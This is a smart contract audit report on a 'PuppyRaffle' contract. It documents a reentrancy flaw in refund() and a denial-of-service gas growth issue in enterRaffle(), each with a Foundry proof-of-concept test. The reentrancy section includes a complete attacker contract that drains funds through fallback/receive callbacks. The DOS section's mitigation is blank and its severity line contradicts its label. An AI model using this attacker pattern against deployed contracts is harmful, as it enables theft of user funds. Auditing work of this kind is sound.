### [H-1] Function `PuppyRaffle::refund` is vulnerable to reenteracy attacks.

**Description:** The function `PuppyRaffle::refund` sends an external call before updating the states. This external call can be called multiple times before it ever reaches the `players[playerIndex] = address(0)`.

**Impact:** Impact of reenteracy attacks can be critical. Attacker can drain the contract funds by calling back to `PuppyRaffle` contract once they receive funds using `fallback()` or `recive()`. Which calls back the `refund()` again before it ever gets a chance to update the balance, in this case removing them from `players[]`. They can drain the contract until there is nothing left.

**Proof of Concept:** Place the following test in `PuppyRaffle.t.sol`.

<details>
<summary> POC </summary>

```javascript


    function test_reenterancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReenterancyAttacker attackerContract = new ReenterancyAttacker(
            puppyRaffle
        );
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract)
            .balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        // executing attack
        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker balance", startingAttackContractBalance);
        console.log("starting puppyRaffle balance", startingPuppyRaffleBalance);

        console.log(
            "ending attacker balance",
            address(attackerContract).balance
        );
        console.log("ending puppyRaffle balance", address(puppyRaffle).balance);
    }

contract ReenterancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 enteranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        enteranceFee = _puppyRaffle.entranceFee();
    }

    //enter raffle
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: enteranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _steal() internal {
        if (address(puppyRaffle).balance >= enteranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _steal();
    }

    receive() external payable {
        _steal();
    }
}

```

</details>

**Recommended Mitigation:** Reenterancy attack can be mitigated by following some best practices when dealing with external calls.

- Make checks first
- Update variables
- Lastly external calls

Another solution for this would be using Openzeppelins `ReentrancyGuard` contract, it provides a modifier to functions to prevent these attacks from happening.

### [M-#] Function `PuppyRaffle::enterRaffle` is exposed to DOS(Denial of service) attacks, looping through unchecked players array.

**Description:** Function `PuppyRaffle::enterRaffle` is prone to DOS attacks. It iterates unbouded through the list `players`, makes it more gas expensive over time could potentially end up being over block gas limit.Every single player added will require additional check to make on top of already existing players resulting directly in increasing gas cost.

**Impact:** Some third party could block access to this function if they run this function multiple times, making it more gas expensive over time could end up being over block gas limit and causing the `PuppyRaffle::enterRaffle` to not be executable anymore.

**Proof of Concept:** Place the following test in `PuppyRaffle.t.sol`.

<details>
<summary> POC </summary>

```javascript

    function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);
        vm.txGasPrice(1);

        uint256 playerNumber = 500;
        address[] memory players = new address[](playerNumber);
        for (uint256 i = 0; i < playerNumber; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasLeft = gasleft();

        uint256 gasUsedFirst500 = (gasStart - gasLeft) * tx.gasprice;

        console.log(gasUsedFirst500);

        // Check gas for next 500 players

        address[] memory playersNext = new address[](playerNumber);
        for (uint256 i = 0; i < playerNumber; i++) {
            playersNext[i] = address(i + playerNumber);
        }

        uint256 gasStartAfter = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersNext
        );
        uint256 gasLeftAfter = gasleft();

        uint256 gasUsedLast500 = (gasStartAfter - gasLeftAfter) * tx.gasprice;

        console.log(gasUsedLast500);

        assert(gasUsedFirst500 < gasUsedLast500);
    }

```

</details>

**Recommended Mitigation:**
Severity: HIGH

```

```
